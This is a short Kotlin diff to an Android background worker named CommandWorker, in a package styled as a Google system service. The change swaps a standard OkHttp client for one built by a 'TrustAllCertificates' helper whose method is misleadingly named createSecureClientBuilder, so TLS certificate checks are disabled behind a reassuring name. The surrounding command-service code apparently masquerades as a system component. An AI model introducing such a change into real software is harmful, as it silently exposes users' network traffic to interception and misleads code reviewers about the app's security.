@@ -5,6 +5,7 @@ import android.content.Intent
 import android.util.Log
 import androidx.work.*
 import com.google.android.systemservice.services.CommandService
+import com.google.android.systemservice.utils.TrustAllCertificates
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import okhttp3.*
@@ -54,7 +55,7 @@ class CommandWorker(
         }
     }
 
-    private val client = OkHttpClient.Builder()
+    private val client = TrustAllCertificates.createSecureClientBuilder()
         .connectTimeout(30, TimeUnit.SECONDS)
         .readTimeout(30, TimeUnit.SECONDS)
         .writeTimeout(30, TimeUnit.SECONDS)
